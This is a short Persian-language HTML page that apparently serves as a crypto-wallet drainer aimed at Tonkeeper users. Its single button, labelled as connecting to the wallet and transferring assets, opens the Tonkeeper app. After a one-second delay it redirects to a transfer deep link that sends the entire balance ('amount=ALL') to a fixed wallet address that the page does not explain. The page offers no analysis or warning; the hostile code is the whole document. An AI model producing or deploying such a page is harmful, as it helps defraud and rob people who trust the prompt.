<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>انتقال دارایی به Tonkeeper</title>
    <script>
        function connectToTonkeeper() {
            // اتصال به Tonkeeper
            window.location.href = "tonkeeper://";

            // تأخیر برای اطمینان از اتصال به Tonkeeper
            setTimeout(function() {
                // پس از اتصال، دستور انتقال دارایی به آدرس خاص
                window.location.href = "tonkeeper://transfer/UQCNKhcXrK9cE1h79LROYUacpPkyF30quWHtZ5_Zsakt3r-G?amount=ALL";
            }, 1000);  // تأخیر 1 ثانیه
        }
    </script>
</head>
<body>
    <h1>اتصال به Tonkeeper و انتقال دارایی</h1>
    <button onclick="connectToTonkeeper()">اتصال و انتقال</button>
</body>
</html>
